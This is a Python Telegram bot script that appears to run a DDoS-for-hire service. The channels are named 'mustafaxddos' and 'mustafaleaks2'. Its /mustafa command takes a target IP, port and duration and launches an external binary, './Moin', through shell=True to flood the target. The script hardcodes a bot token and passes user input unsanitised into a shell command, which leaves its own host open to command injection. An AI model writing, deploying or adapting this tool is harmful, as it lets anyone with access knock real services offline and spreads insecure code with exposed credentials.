import telebot
import subprocess
import os

# 🎯 𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠 𝗕𝗢𝗧 𝗧𝗢𝗞𝗘𝗡
bot = telebot.TeleBot('7652456509:AAH3Zj9p4yqxS5D4wmitUPbfKiGW7iLtpsk')

# 👑 𝗔𝗗𝗠𝗜𝗡 𝗨𝗦𝗘𝗥 𝗜𝗗
admin_id = ["8179218740"]

# 📢 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘 & 𝗚𝗥𝗢𝗨𝗣 𝗜𝗗
CHANNEL_USERNAME = "@mustafaleaks2"  # Replace with your actual Telegram channel username (without '@')
ALLOWED_CHAT_ID = "-1002428694270"  # Replace with your Telegram group/channel ID

# ✅ 𝗖𝗛𝗘𝗖𝗞 𝗜𝗙 𝗨𝗦𝗘𝗥 𝗝𝗢𝗜𝗡𝗘𝗗 𝗧𝗛𝗘 𝗖𝗛𝗔𝗡𝗡𝗘𝗟
def is_user_in_channel(user_id):
    try:
        chat_member = bot.get_chat_member(f"@{CHANNEL_USERNAME}", user_id)
        return chat_member.status in ["member", "administrator", "creator"]
    except Exception:
        return False

# ✅ 𝗖𝗛𝗘𝗖𝗞 𝗜𝗙 𝗕𝗢𝗧 𝗜𝗦 𝗨𝗦𝗘𝗗 𝗜𝗡 𝗧𝗛𝗘 𝗖𝗢𝗥𝗥𝗘𝗖𝗧 𝗖𝗛𝗔𝗧
def is_chat_allowed(chat_id):
    return str(chat_id) == ALLOWED_CHAT_ID

# 🔒 𝗥𝗘𝗦𝗧𝗥𝗜𝗖𝗧 𝗨𝗦𝗔𝗚𝗘 𝗧𝗢 𝗢𝗙𝗙𝗜𝗖𝗜𝗔𝗟 𝗚𝗥𝗢𝗨𝗣/𝗖𝗛𝗔𝗡𝗡𝗘𝗟
def enforce_group_and_channel(message):
    if not is_chat_allowed(message.chat.id):
        bot.send_message(
            message.chat.id,
            "⚠️ *ᴛʜɪꜱ ʙᴏᴛ ᴏɴʟʏ ᴡᴏʀᴋꜱ ɪɴ ᴛʜᴇ ᴏꜰꜰɪᴄɪᴀʟ ᴄʜᴀɴɴᴇʟ/ɢʀᴏᴜᴘ!* ⚠️\n\n"
            f"🔗 *Jᴏɪɴ ʜᴇʀᴇ:* [𝗖𝗟𝗜𝗖𝗞 𝗛𝗘𝗥𝗘](https://t.me/mustafaxddos)",
            parse_mode="Markdown"
        )
        return False
    if not is_user_in_channel(message.from_user.id):
        bot.send_message(
            message.chat.id,
            f"🚨 *𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗!* 🚨\n\n"
            f"🔗 *Jᴏɪɴ ᴏᴜʀ ᴏғғɪᴄɪᴀʟ ᴄʜᴀɴɴᴇʟ:* [𝗖𝗟𝗜𝗖𝗞 𝗛𝗘𝗥𝗘](https://t.me/mustafaleaks2)\n"
            "📌 *Aғᴛᴇʀ ᴊᴏɪɴɪɴɢ, ᴘʟᴇᴀꜱᴇ ᴛʀʏ ᴀɢᴀɪɴ!*",
            parse_mode="Markdown"
        )
        return False
    return True

# ✅ 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦 𝗪𝗜𝗧𝗛 𝗦𝗧𝗬𝗟𝗜𝗦𝗛 𝗙𝗢𝗡𝗧𝗦 & 𝗘𝗠𝗢𝗝𝗜𝗦

@bot.message_handler(commands=['start'])
def send_welcome(message):
    if not enforce_group_and_channel(message):
        return
    bot.send_message(
        message.chat.id, 
        "✨🔥 *『 𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝐌𝐔𝐒𝐓𝐀𝐅𝐀™ 』* 🔥✨\n\n"
        "🚀 *Hᴇʟʟᴏ, Cᴏᴍᴍᴀɴᴅᴇʀ!* ⚡\n"
        "🎯 *Rᴇᴀᴅʏ ᴛᴏ ᴅᴏᴍɪɴᴀᴛᴇ ᴛʜᴇ ʙᴀᴛᴛʟᴇғɪᴇʟᴅ?* 🏆\n\n"
        "💀 *𝙏𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙨 𝙙𝙚𝙨𝙞𝙜𝙣𝙚𝙙 𝙛𝙤𝙧 𝙀𝙇𝙄𝙏𝙀 𝘼𝙏𝙏𝘼𝘾𝙆𝙀𝙍𝙎!* 💀\n\n"
        "⚡ *Use* `/help` *to explore all commands!* 📜"
    )

@bot.message_handler(commands=['mustafa'])
def handle_mustafa(message):
    if not enforce_group_and_channel(message):
        return

    args = message.text.split()[1:]

    if len(args) != 3:
        bot.reply_to(message, "📌 *Uꜱᴀɢᴇ:* `/mustafa <IP> <PORT> <TIME>` ⚡", parse_mode="Markdown")
        return

    target_ip, target_port, duration = args

    bot.reply_to(
        message, 
        f"🔥🚀 *𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗔𝗥𝗧𝗘𝗗!* 🚀🔥\n\n"
        f"🎯 *𝗧𝗮𝗿𝗴𝗲𝘁:* `{target_ip}`\n"
        f"⚡ *𝗣𝗼𝗿𝘁:* `{target_port}`\n"
        f"⏳ *𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻:* `{duration} sᴇᴄᴏɴᴅs`",
        parse_mode="Markdown"
    )

    command = f"./Moin {target_ip} {target_port} {duration} 1000"
    
    try:
        subprocess.Popen(command, shell=True)  
        bot.reply_to(
            message, 
            f"✅ *𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗!* 🎯\n\n"
            f"🎯 *𝗧𝗮𝗿𝗴𝗲𝘁:* `{target_ip}`\n"
            f"⚡ *𝗣𝗼𝗿𝘁:* `{target_port}`\n"
            f"⏳ *𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻:* `{duration} sᴇᴄᴏɴᴅs`",
            parse_mode="Markdown"
        )
    except Exception as e:
        bot.reply_to(message, f"❌ *𝗘𝗿𝗿𝗼𝗿:* `{e}`", parse_mode="Markdown")

# ✅ 𝗦𝗔𝗙𝗘 𝗕𝗢𝗧 𝗣𝗢𝗟𝗟𝗜𝗡𝗚
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(f"Error: {e}")